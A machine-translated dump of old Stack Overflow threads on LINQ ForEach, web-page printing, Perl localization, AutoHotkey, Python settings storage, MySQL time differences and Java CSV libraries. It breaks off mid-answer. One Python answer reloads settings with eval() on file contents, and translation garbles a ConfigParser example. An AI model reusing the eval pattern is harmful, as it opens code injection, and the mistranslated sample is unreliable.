Lazy 版本需要具体化，例如**ToList** ()，否则，什么也不会发生。请参阅下面来自 ToolmakerSteve 的精彩评论。

```
IQueryable<Product> query = Products.Where(...);
query.ForEachLazy(t => t.Price = t.Price + 1.00)
    .ToList(); //without this line, below SubmitChanges() does nothing.
SubmitChanges(); 
```

我将 ForEach() 和 ForEachLazy() 都保存在我的库中。

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2014-09-11T00:17:23.567

受 Jon Skeet 的启发，我扩展了他的解决方案：

**扩展方法：**

```
public static void Execute<TSource, TKey>(this IEnumerable<TSource> source, Action<TKey> applyBehavior, Func<TSource, TKey> keySelector)
{
    foreach (var item in source)
    {
        var target = keySelector(item);
        applyBehavior(target);
    }
} 
```

**客户：**

```
var jobs = new List<Job>() 
    { 
        new Job { Id = "XAML Developer" }, 
        new Job { Id = "Assassin" }, 
        new Job { Id = "Narco Trafficker" }
    };

jobs.Execute(ApplyFilter, j => j.Id); 
```

. . .

```
 public void ApplyFilter(string filterId)
    {
        Debug.WriteLine(filterId);
    } 
```

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2012-07-03T00:47:40.830

这种“功能性方法”抽象泄露了很多时间。语言层面上没有任何东西可以防止副作用。只要您可以让它为容器中的每个元素调用您的 lambda/delegate - 您将获得“ForEach”行为。

这里例如将 srcDictionary 合并到 destDictionary 的一种方法（如果键已经存在 - 覆盖）

**这是一个 hack，不应在任何生产代码中使用。**

```
var b = srcDictionary.Select(
                             x=>
                                {
                                  destDictionary[x.Key] = x.Value;
                                  return true;
                                }
                             ).Count(); 
```

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2018-10-19T07:05:05.057

MoreLinq 有`IEnumerable<T>.ForEach`很多其他有用的扩展。可能不值得将依赖项仅仅用于`ForEach`，但其中有很多有用的东西。

[https://www.nuget.org/packages/morelinq/](https://www.nuget.org/packages/morelinq/)

[https://github.com/morelinq/MoreLINQ](https://github.com/morelinq/MoreLINQ)

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2009-07-10T02:56:19.557

我不同意链接扩展方法应该没有副作用的观点（不仅因为它们不是，任何委托都可以执行副作用）。

考虑以下：

```
 public class Element {}

   public Enum ProcessType
   {
      This = 0, That = 1, SomethingElse = 2
   }

   public class Class1
   {
      private Dictionary<ProcessType, Action<Element>> actions = 
         new Dictionary<ProcessType,Action<Element>>();

      public Class1()
      {
         actions.Add( ProcessType.This, DoThis );
         actions.Add( ProcessType.That, DoThat );
         actions.Add( ProcessType.SomethingElse, DoSomethingElse );
      }

      // Element actions:

      // This example defines 3 distict actions
      // that can be applied to individual elements,
      // But for the sake of the argument, make
      // no assumption about how many distict
      // actions there may, and that there could
      // possibly be many more.

      public void DoThis( Element element )
      {
         // Do something to element
      }

      public void DoThat( Element element )
      {
         // Do something to element
      }

      public void DoSomethingElse( Element element )
      {
         // Do something to element
      }

      public void Apply( ProcessType processType, IEnumerable<Element> elements )
      {
         Action<Element> action = null;
         if( ! actions.TryGetValue( processType, out action ) )
            throw new ArgumentException("processType");
         foreach( element in elements ) 
            action(element);
      }
   } 
```

该示例显示的实际上只是一种后期绑定，它允许调用对一系列元素具有副作用的许多可能动作中的一个，而无需编写一个大的 switch 构造来解码定义动作的值并翻译将其转化为相应的方法。

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2019-02-28T17:38:48.970

为了保持流利，可以使用这样的技巧：

```
GetItems()
    .Select(i => new Action(i.DoStuf)))
    .Aggregate((a, b) => a + b)
    .Invoke(); 
```

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2013-03-14T19:41:58.947

对于 VB.NET，您应该使用：

```
listVariable.ForEach(Sub(i) i.Property = "Value") 
```

* * *

## 回答 #22

> 赞同：-1
> 
> 时间：2010-07-17T23:16:19.647

又一个`ForEach`例子

```
public static IList<AddressEntry> MapToDomain(IList<AddressModel> addresses)
{
    var workingAddresses = new List<AddressEntry>();

    addresses.Select(a => a).ToList().ForEach(a => workingAddresses.Add(AddressModelMapper.MapToDomain(a)));

    return workingAddresses;
} 
```

# jakarta-ee - 在 Java 中以编程方式打印网页

> ID：200576
> 
> 赞同：2
> 
> 时间：2008-10-14T09:56:44.050
> 
> 标签：jakarta-ee, printing-web-page, web-based

我有一个基于 J2EE 的 Web 应用程序。

在其中一页中有一个标有“打印”的按钮。

我的问题是这样的：

用户输入工具名称，例如：ToolName1 ToolName2 ToolName3

然后点击“打印”。

预期的操作是从 db 中检索 3 个工具的工具详细信息，然后每页打印一个工具。（即单击此按钮时，应在后台数据库检索中进行一些处理，然后再将详细信息发送到打印机...）

请建议如何最好地完成打印网页的任务。

希望问题很清楚。

提前致谢...：）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T10:01:54.007

您可以让按钮调用一些 Javascript：

```
<script>
    function printPage() {
        window.print();  
    }
</script> 
```

您可以使用以下方式调用它：

```
<form>
<input TYPE="button" onClick="printPage()">
</form> 
```

或直接作为：

```
<input TYPE="button" onClick="window.print()"> 
```

如果您需要将输出格式化到多个页面上，您将使用**page-break-before** CSS 属性。例如：

```
<style>
    div.tool {
        page-break-before: always
    }
</style>

<div class="tool" id="tool1">
...
</div>
<div class="tool" id="tool2">
...
</div> 
```

您可以按照 Guido García 的建议将其放在“打印”特定样式表中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T10:05:51.503

在客户端，你可以打电话`window.print();`

其他提示：

*   您可以使用打印机友好的 CSS 来自定义您的页面演示：

> ```
> <link rel="stylesheet" type="text/css" media="print" href="print.css" /> 
> ```

*   您可以使用生成页面的 PDF 版本的服务器端组件。在许多情况下，对最终演示文稿进行深入控制是很有趣的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2010-11-04T15:41:57.603

打印按钮应将表单提交到您准备要打印的输出（工具详细信息等）的服务器。这会像往常一样使用您的 JSP 页面或其他方式呈现。

要完成这项工作，请在结果页面上调用`window.print()`并在页面加载（或文档就绪事件）时触发它。

编辑：嗯。我应该看看日期。哦，好吧，建议成立。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T10:00:11.220

我猜在客户端？如果是这样，那么除了 JavaScript 之外，没有什么是关于 Java 的。只需调用 window.print() 方法，它就会提示一个打印对话框窗口。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T10:21:10.817

如果您要打印的页面需要额外的逻辑，您可以执行以下任一操作：

*   [在常规页面中包含计算数据，但将其隐藏（style="visibility:hidden"），然后按照Guido](https://stackoverflow.com/questions/200576/printing-web-page-programmatically-in-java#200605)的描述使用 print.css（media=print）使其可见，因此它仅在您打印时显示。
*   创建一个新页面，您可以从包含计算数据的常规页面链接到

两者都有自己的优势。

我还建议您不要只依赖 Javascript。由于您没有运行 JS，因此无法打印打印按钮时可能会相当混乱。我建议您创建一个常规的 html 链接，该链接指向要打印的页面，用户可以在其中使用浏览器的打印按钮。使用 javascript 隐藏此链接并将其替换为 javascript 相关按钮。这将确保该按钮仅在启用 javascript 时显示。

# perl - 如何在不同的堆栈框架中本地化 Perl 变量？

> ID：200578
> 
> 赞同：24
> 
> 时间：2008-10-14T09:57:58.400
> 
> 标签：perl, scope, local

我有一些自动生成的代码，它们在一些代码的不同位置有效地写出以下内容：

```
no warnings 'uninitialized';
local %ENV = %ENV;
local $/   = $/;
local @INC = @INC;
local %INC = %INC;
local $_   = $_;
local $|   = $|;
local %SIG = %SIG;
use warnings 'uninitialized'; 
```

在自动生成代码时，一些人认为代码“漂亮”并不是绝对必要的，但我想把它拉到一个子程序中。但是，这会将这些变量本地化在该子例程中。有没有办法在调用堆栈帧中本地化这些变量？

**更新**：以类似的方式，能够在更高的堆栈帧中运行 eval 会很好。我认为 Python 已经有了这个。如果 Perl 也这样做，那就太好了。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2008-10-14T13:53:25.023

也许您可以安排将使用这些本地变量的代码作为闭包生成？那么你可以

```
sub run_with_env {
    my ($sub, @args) = @_;
    no warnings 'uninitialized';
    local %ENV = %ENV;
    local $/   = $/;
    local @INC = @INC;
    local %INC = %INC;
    local $_   = $_;
    local $|   = $|;
    local %SIG = %SIG;
    use warnings 'uninitialized';  
    $sub->(@args);
}

run_with_env(sub {
    # do stuff here
});

run_with_env(sub {
    # do different stuff here
}); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-14T12:28:40.437

不知道为什么 QuantumPete 被否决，他似乎是对的。您无法告诉`local`在调用块中初始化变量。它的功能很特殊，它所做的初始化/拆卸只适用于它运行的块。

有一些实验性模块，例如[Sub::Uplevel](http://search.cpan.org/dist/Sub-Uplevel/)和[Devel::RunBlock](http://search.cpan.org/dist/Devel-RunBlock/lib/Devel/RunBlock.pm)，它们允许您尝试“愚弄”`caller()`子例程或将值“长跳转返回”到更高的堆栈帧（分别），但这些都没有任何影响如何`local`对待变量的东西（我试过了。:)

因此，就目前而言，确实看起来您将不得不在需要它们的范围内使用本地声明。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T10:05:35.310

我对 Perl 不是很熟悉，所以如果真的可能，请原谅我。但通常，堆栈帧的局部变量仅在该堆栈帧内可用。您不能从更高或更低的访问它们（除非您执行一些 hacky 指针算术，但这永远不能保证成功）。不幸的是，大块的变量声明是你必须忍受的。

量子皮特

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-15T01:53:47.987

perldoc perlguts 说：

```
 The "Alias" module implements localization of the basic types within
   the caller's scope.  People who are interested in how to localize
   things in the containing scope should take a look there too. 
```

FWIW。我还没有仔细查看 Alias.pm，以了解这可能是多么容易。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T11:35:21.137

在 TCL 中，您可以使用[uplevel](http://en.wikipedia.org/wiki/Uplevel)。至于 Perl，我不知道。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-17T22:08:19.577

Perl 有[Sub::Uplevel](http://search.cpan.org/dist/Sub-Uplevel/lib/Sub/Uplevel.pm)

# autohotkey - 如何使用 Autoit / Autohotkey 模仿 Visual Studio 的“Ctrl-K，C”两步宏行为？

> ID：200587
> 
> 赞同：15
> 
> 时间：2008-10-14T10:00:22.857
> 
> 标签：autohotkey

我正在尝试为一些常见任务设置[AutoHotkey](http://www.autohotkey.com/)宏，并且我希望热键模仿 Visual Studio 的“两步快捷方式”行为 - 即按下`Ctrl`-`K`将启用“宏模式”；在宏模式下，按某些键将运行宏然后禁用“宏模式”，任何其他键只会禁用宏模式。

示例 - 输入文件名时，我希望能够通过点击`Ctrl`-插入今天的日期`K`，然后按`D`。

有没有人有一个像这样行为的有状态 AutoHotkey 脚本的好例子？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-14T16:57:37.693

这个 Autohotkey 脚本，当你按下`ctrl`+时`k`，将等待你按下一个键，如果你按下`d`，它将输入当前日期。

```
^k::
Input Key, L1
FormatTime, Time, , yyyy-MM-dd
if Key = d
    Send %Time%
return 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-15T08:41:25.933

接受的答案略有不同 - 这就是我最终使用的。我正在捕获 Ctrl+LWin（左 Windows 键），因此它不会与 VS 内置的 Ctrl-K 快捷键冲突。

```
; Capture Ctrl+Left Windows Key
^LWin::

; Show traytip including shortcut keys
TrayTip, Ctrl-Win pressed - waiting for second key..., t: current time`nd: current date, 1, 1

; Capture next string input (i.e. next key)
Input, Key, L1

; Call TrayTip with no arguments to remove currently-visible traytip
TrayTip

if Key = d
{
    FormatTime, Date, , yyyyMMdd
    SendInput %Date%
} 
else if Key = t 
{
    FormatTime, Time, , hhmmss
    SendInput %Time%
}   
return 
```

# python - 在 Python 中存储简单的用户设置

> ID：200599
> 
> 赞同：8
> 
> 时间：2008-10-14T10:04:46.327
> 
> 标签：python, database, web, settings

我正在编写一个网站，用户将在其中进行许多设置，例如他们选择的配色方案等。我很乐意将这些存储为纯文本文件，安全性不是问题。

我目前看到的方式是：有一个字典，其中所有键都是用户，值是字典，其中包含用户的设置。

例如，userdb["bob"]["colour_scheme"] 的值为 "blue"。

将其存储在文件中的最佳方式是什么？腌字典？

有没有更好的方法来做我想做的事情？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-14T21:50:29.490

我会使用[ConfigParser](http://www.python.org/doc/2.5.2/lib/module-ConfigParser.html)模块，它会为您的示例生成一些非常易读且用户可编辑的输出：

```
[鲍勃]
colour_scheme：蓝色
英国人：是的
[乔]
color_scheme：那是“颜色”，傻！
英国：没有
```

以下代码将生成上面的配置文件，然后将其打印出来：

```
import sys
from ConfigParser import *

c = ConfigParser()

c.add_section("bob")
c.set("bob", "colour_scheme", "blue")
c.set("bob", "british", str(True))

c.add_section("joe")
c.set("joe", "color_scheme", "that's 'color', silly!")
c.set("joe", "british", str(False))

c.write(sys.stdout)  # this outputs the configuration to stdout
                     # you could put a file-handle here instead

for section in c.sections(): # this is how you read the options back in
    print section
    for option in c.options(section):
            print "\t", option, "=", c.get(section, option)

print c.get("bob", "british") # To access the "british" attribute for bob directly 
```

请注意，ConfigParser 仅支持字符串，因此您必须像我在上面对布尔值所做的那样进行转换。请参阅[effbot](http://effbot.org/librarybook/configparser.htm)了解基础知识。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-14T10:10:11.900

在字典上使用[cPickle](http://www.python.org/doc/2.5.2/lib/module-cPickle.html)将是我的选择。字典自然适合此类数据，因此鉴于您的要求，我认为没有理由不使用它们。除非您考虑从非 python 应用程序中读取它们，否则您必须使用语言中性的文本格式。即使在这里，您也可以使用泡菜和导出工具。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-10-14T10:15:35.400

我不解决哪个最好的问题。如果你想处理文本文件，我会考虑[ConfigParser -module](http://www.python.org/doc/2.5.2/lib/module-ConfigParser.html)。您可以尝试的另一个是[simplejson](http://undefined.org/python/)或[yaml](http://www.yaml.org/)。你也可以考虑一个真正的数据库表。

例如，您可以有一个名为 userattrs 的表，其中包含三列：

*   诠释 user_id
*   字符串属性名
*   字符串属性值

如果只有少数，您可以将它们存储到 cookie 中以便快速检索。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-10-14T10:15:49.517

这是最简单的方法。使用简单的变量和`import`设置文件。

调用文件 userprefs.py

```
# a user prefs file
color = 0x010203
font = "times new roman"
position = ( 12, 13 )
size = ( 640, 480 ) 
```

在您的应用程序中，您需要确保可以导入此文件。你有*很多*选择。

1.  使用`PYTHONPATH`. 需要`PYTHONPATH`设置为包含首选项文件的目录。

    一种。用于命名文件的显式命令行参数（不是最好的，但很简单）

    湾。用于命名文件的环境变量。

2.  扩展`sys.path`以包含用户的主目录

例子

```
import sys
import os
sys.path.insert(0,os.path.expanduser("~"))
import userprefs 
print userprefs.color 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T14:08:57.097

当然，对于数据库驱动的网站，最好的选择是 db 表。我假设你没有做数据库的事情。

如果您不关心人类可读的格式，那么`pickle`这是一种简单直接的方法。我也听说过关于`simplejson`.

如果人类可读性很重要，那么有两个简单的选择：

**模块：**只需使用一个模块。如果您只需要一些全局变量并且没有什么花哨的，那么这就是要走的路。如果你真的很绝望，你可以定义类和类变量来模拟部分。这里的缺点：如果文件将由用户手动编辑，错误可能难以捕捉和调试。

**INI 格式：**我一直在使用[ConfigObj](http://www.voidspace.org.uk/python/configobj.html)，并取得了相当大的成功。ConfigObj 本质上是 ConfigParser 的替代品，支持嵌套部分等等。或者，您可以定义文件的预期类型或值并对其进行验证，从而为用户/管理员提供安全网（和重要的错误反馈）。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-14T12:32:07.027

如果我必须将这些设置存储在文件系统上，我会使用[搁置](http://www.python.org/doc/2.5.2/lib/module-shelve.html)或[sqlite数据库。](http://www.python.org/doc/2.5.2/lib/module-sqlite3.html)虽然，既然您正在构建一个网站，您可能会使用某种数据库，那么为什么不直接使用它呢？

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-14T21:58:00.693

内置的[sqlite3](http://www.python.org/doc/2.5.2/lib/module-sqlite3.html)模块可能比大多数替代品要简单得多，并且可以让您准备好在您想要或需要时更新到完整的 RDBMS。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-14T10:19:53.987

如果配置文件的人类可读性很重要，一个替代方案可能是[ConfigParser 模块](http://www.python.org/doc/lib/module-ConfigParser.html)，它允许您读取和写入类似 .ini 的文件。但是你被限制在一个嵌套级别。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-14T10:13:48.197

如果您有数据库，我可能建议将设置存储在数据库中。但是，听起来普通文件可能更适合您的环境。

您可能不想将*所有*用户设置存储在同一个文件中，因为您可能会在并发访问该文件时遇到麻烦。如果您将每个用户的设置作为字典存储在他们自己的腌制文件中，那么他们将能够独立行动。

Pickling 是一种存储此类数据的合理方式，但不幸的是，众所周知，pickle 数据格式不适合人类阅读。您最好将其存储为`repr(dictionary)`更具可读性的格式。要重新加载用户设置，请使用`eval(open("file").read())`或类似的东西。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-14T12:50:27.240

您没有为此使用数据库是否有特殊原因？这似乎是正常和自然的事情 - 或者将设置的pickle存储在用户ID或其他内容的数据库中。

您还没有描述网站的使用模式，而只是考虑了一个一般网站 - 但我认为将设置保存在数据库中会比使用文件导致更少的磁盘 I/O。

OTOH，对于客户端代码可能使用的设置，将它们作为 javascript 存储在可以缓存的静态文件中会很方便 - 以您可能有多个位置为代价。（我可能会将这些设置存储在数据库中，并根据需要重建静态文件）

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-14T14:01:44.727

我同意关于使用腌制字典的答复。在字典结构中存储简单数据非常简单有效。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-14T14:02:28.000

如果您不关心自己能够编辑文件，并且想要一种快速保存 python 对象的方法，请使用[pickle](http://www.python.org/doc/2.5.2/lib/module-pickle.html)。如果您确实希望文件可以被人类读取，或者可以被其他应用程序读取，请使用[ConfigParser](http://www.python.org/doc/2.5.2/lib/module-ConfigParser.html)。如果您需要更复杂的东西，请使用某种数据库，无论是关系型（[sqlite](http://www.python.org/doc/2.5.2/lib/module-sqlite3.html)）还是面向对象（[axiom](http://www.divmod.org/trac/wiki/DivmodAxiom)，[zodb](http://wiki.zope.org/ZODB/FrontPage)）。

# sql - SQL(?): Counting the time between two datetime values

> ID：200602
> 
> 赞同：4
> 
> 时间：2008-10-14T10:05:25.140
> 
> 标签：sql, mysql, datediff

What is the best way to count the time between two datetime values fetched from MySQL when I need to count only the time between hours 08:00:00-16:00:00.

For example if I have values 2008-10-13 18:00:00 and 2008-10-14 10:00:00 the time difference should be 02:00:00.

Can I do it with SQL or what is the best way to do it? I'm building a website and using PHP.

Thank you for your answers.

EDIT: The exact thing is that I'm trying to count the time a "ticket" has been in a specific state during working hours. The time could be like a couple weeks.

EDIT2: I have no problems counting the actual time difference, but substracting that off-time, 00:00:00-08:00:00 and 16:00:00-00:00:00 per day.

-Samuli

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-14T10:07:09.177

The [TIMEDIFF](http://dev.mysql.com/doc/refman/5.0/en/date-and-time-functions.html#function_timediff) function

> TIMEDIFF() returns expr1 – expr2 expressed as a time value. expr1 and expr2 are time or date-and-time expressions, but both must be of the same type.

```
mysql> SELECT TIMEDIFF('2000:01:01 00:00:00',
    ->                 '2000:01:01 00:00:00.000001');
        -> '-00:00:00.000001'
mysql> SELECT TIMEDIFF('2008-12-31 23:59:59.000001',
    ->                 '2008-12-30 01:01:01.000002');
        -> '46:58:57.999999' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T10:13:13.673

I think you should calculate the difference in your own code instead of using a more-complex SQL sentence because:

*   That calculation seems to be part of your business logic. It seems easier to maintain if you integrate it with the rest of your business code.
*   The database is often the bottleneck, so don't load it more than needed.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T10:10:32.900

You may want to try it in PHP, but I'm thinking it'll be faster in DB

[code to return difference in an array](http://www.gidnetwork.com/b-16.html)

# java - 你能推荐一个 Java 库来读取（并且可能写入）CSV 文件吗？

> ID：200609
> 
> 赞同：51
> 
> 时间：2008-10-14T10:08:20.187
> 
> 标签：java, parsing, csv

您能否推荐一个用于读取、解析、验证逗号分隔值 (CSV) 文件中的行并将其映射到 Java 值对象 (JavaBeans) 的 Java 库？

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2008-10-14T10:14:04.687

我们已经 成功使用了[http://opencsv.sourceforge.net/](http://opencsv.sourceforge.net/)

我还遇到了另一个链接很好的问题： [Java lib or app to convert CSV to XML file?](https://stackoverflow.com/questions/123/csv-file-to-xml)

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-09-20T00:36:59.847

[Super CSV](http://supercsv.sourceforge.net)是读取/解析、验证和映射 CSV 文件到 POJO 的绝佳选择！

我们（Super CSV 团队）刚刚发布了一个新版本（您可以从 SourceForge 或 Maven[下载它）。](http://supercsv.sourceforge.net/downloading.html)

# 读取 CSV 文件

以下示例使用`CsvDozerBeanReader`（我们刚刚发布的一个新阅读器，它使用[Dozer](http://dozer.sourceforge.net/)进行具有深度映射和基于索引的映射支持的 bean 映射） - 它基于我们[网站](http://supercsv.sourceforge.net/examples_dozer.html)上的示例。如果您不需要 Dozer 功能（或者您只想要一个简单的独立依赖项），那么您可以使用`CsvBeanReader`（参见此[代码示例](http://supercsv.sourceforge.net/examples_reading.html)）。

## 示例 CSV 文件

这是一个表示对调查的响应的示例 CSV 文件。它有一个标题和 3 行数据，全部有 8 列。

```
age,consentGiven,questionNo1,answer1,questionNo2,answer2,questionNo3,answer3
18,Y,1,Twelve,2,Albert Einstein,3,Big Bang Theory
,Y,1,Thirteen,2,Nikola Tesla,3,Stargate
42,N,1,,2,Carl Sagan,3,Star Wars 
```

## 定义从 CSV 到 POJO 的映射

CSV 的每一行都将读入一个[SurveyResponse](http://supercsv.sourceforge.net/xref-test/org/supercsv/mock/dozer/SurveyResponse.html)类，每个类都有一个 List of [Answer](http://supercsv.sourceforge.net/xref-test/org/supercsv/mock/dozer/Answer.html)。为了使映射工作，您的类应该是有效的 Javabean（即具有默认的无参数构造函数并为每个字段定义 getter/setter）。

在 Super CSV 中，您使用简单的字符串数组定义映射 - 数组的每个元素对应于 CSV 文件中的一列。

`CsvDozerBeanMapper`你可以使用：

*   简单的字段映射（例如`firstName`）

*   深度映射（例如`address.country.code`）

*   索引映射（例如`middleNames[1]`- 数组或集合的从零开始的索引）

*   深度+索引映射（例如`person.middleNames[1]`）

以下是此示例的字段映射 - 它使用了这些的组合：

```
private static final String[] FIELD_MAPPING = new String[] { 
        "age",                   // simple field mapping (like for CsvBeanReader)
        "consentGiven",          // as above
        "answers[0].questionNo", // indexed (first element) + deep mapping
        "answers[0].answer", 
        "answers[1].questionNo", // indexed (second element) + deep mapping
        "answers[1].answer", 
        "answers[2].questionNo", 
        "answers[2].answer" }; 
```

## 转换和验证

Super CSV 有一个有用的[单元处理器](http://supercsv.sourceforge.net/cell_processors.html)库，可用于将字符串从 CSV 文件转换为其他数据类型（例如日期、整数），或进行约束验证（例如强制/可选、正则表达式匹配、范围检查） .

使用单元处理器是*完全可选*的——没有它们，CSV 的每一列都将是一个字符串，因此每个字段也必须是一个字符串。

以下是该示例的单元处理器配置。与字段映射一样，数组中的每个元素都代表一个 CSV 列。它演示了单元处理器如何将 CSV 数据转换为字段的数据类型，以及如何将它们链接在一起。

```
final CellProcessor[] processors = new CellProcessor[] { 
    new Optional(new ParseInt()), // age
    new ParseBool(),              // consent
    new ParseInt(),               // questionNo 1
    new Optional(),               // answer 1
    new ParseInt(),               // questionNo 2
    new Optional(),               // answer 2
    new ParseInt(),               // questionNo 3
    new Optional()                // answer 3
}; 
```

## 阅读

使用 Super CSV 读取非常灵活：您提供自己的`Reader`（因此您可以从文件、类路径、zip 文件等中读取），并且分隔符和引号字符可通过[首选项](http://supercsv.sourceforge.net/preferences.html)进行配置（其中有许多 pre - 满足大多数用途的定义配置）。

下面的代码非常不言自明。

1.  创建阅读器（根据您的`Reader`喜好）

2.  （可选）阅读标题

3.  配置bean映射

4.  继续打电话`read()`，直到你得到一个`null`（文件结束）

5.  关闭阅读器

**代码：**

```
ICsvDozerBeanReader beanReader = null;
try {
    beanReader = new CsvDozerBeanReader(new FileReader(CSV_FILENAME),
        CsvPreference.STANDARD_PREFERENCE);

    beanReader.getHeader(true); // ignore the header
    beanReader.configureBeanMapping(SurveyResponse.class, FIELD_MAPPING);

    SurveyResponse surveyResponse;
    while( (surveyResponse = 
        beanReader.read(SurveyResponse.class, processors)) != null ) {
        System.out.println(
            String.format("lineNo=%s, rowNo=%s, surveyResponse=%s",
                beanReader.getLineNumber(), beanReader.getRowNumber(), 
                surveyResponse));
    }

} finally {
    if( beanReader != null ) {
        beanReader.close();
    }
} 
```

**输出：**

```
lineNo=2, rowNo=2, surveyResponse=SurveyResponse [age=18, consentGiven=true, answers=[Answer [questionNo=1, answer=Twelve], Answer [questionNo=2, answer=Albert Einstein], Answer [questionNo=3, answer=Big Bang Theory]]]
lineNo=3, rowNo=3, surveyResponse=SurveyResponse [age=null, consentGiven=true, answers=[Answer [questionNo=1, answer=Thirteen], Answer [questionNo=2, answer=Nikola Tesla], Answer [questionNo=3, answer=Stargate]]]
lineNo=4, rowNo=4, surveyResponse=SurveyResponse [age=42, consentGiven=false, answers=[Answer [questionNo=1, answer=null], Answer [questionNo=2, answer=Carl Sagan], Answer [questionNo=3, answer=Star Wars]]] 
```

## 更多信息

[您可以在网站](http://supercsv.sourceforge.net)上找到更多信息！

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-18T10:03:42.520

我可以推荐[SuperCSV](http://supercsv.sourceforge.net/)。使用简单，并做了我需要的一切。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T11:33:37.303

嘿，我有一个开源项目：[JFileHelpers](http://jfilehelpers.com)。我认为主要优点是它使用Java Annotations，看看：

如果你有这个 bean：

```
@FixedLengthRecord()
public class Customer {
    @FieldFixedLength(4)
    public Integer custId;

    @FieldAlign(alignMode=AlignMode.Right)
    @FieldFixedLength(20)
    public String name;

    @FieldFixedLength(3)
    public Integer rating;

    @FieldTrim(trimMode=TrimMode.Right)
    @FieldFixedLength(10)
    @FieldConverter(converter = ConverterKind.Date, 
    format = "dd-MM-yyyy")
    public Date addedDate;

    @FieldFixedLength(3)
    @FieldOptional
    public String stockSimbol;    
} 
```

并想解析这个文件：

```
....|....1....|....2....|....3....|....4                
1   Antonio Pereira     10012-12-1978ABC
2   Felipe Coury          201-01-2007
3   Anderson Polga       4212-11-2007DEF 
```

您所要做的就是：

```
FileHelperEngine<Customer> engine = 
    new FileHelperEngine<Customer>(Customer.class); 
List<Customer> customers = 
    new ArrayList<Customer>();

customers = engine.readResource(
    "/samples/customers-fixed.txt"); 
```

此外，它还支持主从、日期和格式转换等等。让我知道你的想法！

最好的祝福！

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T11:19:39.997

我发现[Flatpack](http://flatpack.sourceforge.net/)非常适合处理古怪的 CSV 文件（转义、引号、不良记录等）

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-14T10:27:27.543

之前提出的 CSV File to XML 问题似乎回答了我所有的问题。

OpenCSV ( [http://opencsv.sourceforge.net/](http://opencsv.sourceforge.net/) ) 也使用列位置映射策略绑定到 JavaBeans

```
 ColumnPositionMappingStrategy strat = new ColumnPositionMappingStrategy();
  strat.setType(YourOrderBean.class);
  String[] columns = new String[] {"name", "orderNumber", "id"}; // the fields to bind do in your JavaBean
  strat.setColumnMapping(columns);

  CsvToBean csv = new CsvToBean();
  List list = csv.parse(strat, yourReader); 
```

JSEFA ( [http://jsefa.sourceforge.net](http://jsefa.sourceforge.net) ) 除了支持 FLR 和 XML 之外，似乎还可以满足我的所有需求 - 特别是绑定到 Java 对象

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-14T10:14:57.320

我使用[OpenCSV](http://opencsv.sourceforge.net/)从 Java 解析和写入 CSV 文件都取得了很好的成功。如果您想使用 Java 读取或编写与 Excel 兼容的电子表格，Apache 的[POI](http://poi.apache.org/)库是您的最佳选择。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-09-26T20:15:50.603

请参阅[CVSBeans](http://sourceforge.net/projects/csvbeans/)

# sql - 如何在 Linq to SQL 表达式中使用 SQL 的 GETDATE() 和 DATEADD()？

> ID：200617
> 
> 赞同：27
> 
> 时间：2008-10-14T10:11:45.750
> 
> 标签：sql, linq-to-sql

如果我有这样的`Linq`to`SQL`表达：

```
 from subscription in dbContext.Subscriptions
 where subscription.Expires > DateTime.Now
select subscription 
```

我希望它使用 SQL Servers`GETDATE()`函数而不是机器运行`C#`程序的时间。

下一个问题是如何翻译这个：

```
DateTime.Now.AddDays(2) 
```

对此：

```
DATEADD(dd, 2, GETDATE()) 
```

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2008-10-14T13:01:29.450

试试[这个](http://peteohanlon.wordpress.com/2008/01/11/sql-server-getdate-and-linq-to-sql/)：

```
[Function(Name="GetDate", IsComposable=true)] 
 public DateTime GetSystemDate() 
 {   
    MethodInfo mi = MethodBase.GetCurrentMethod() as MethodInfo;   
    return (DateTime)this.ExecuteMethodCall(this, mi, new object[]{}).ReturnValue; 
 } 
```

**编辑**：这需要成为您的 DataContext 类的一部分。

现在您可以在查询中使用 GetSystemDate() 而不是 DateTime.Now。至于日期差异，请查看 System.Data.Linq.SqlClient 命名空间，尤其是 SqlMethods 类的 DayDiffXXX 函数。

* * *

## 回答 #2

> 赞同：6
> 
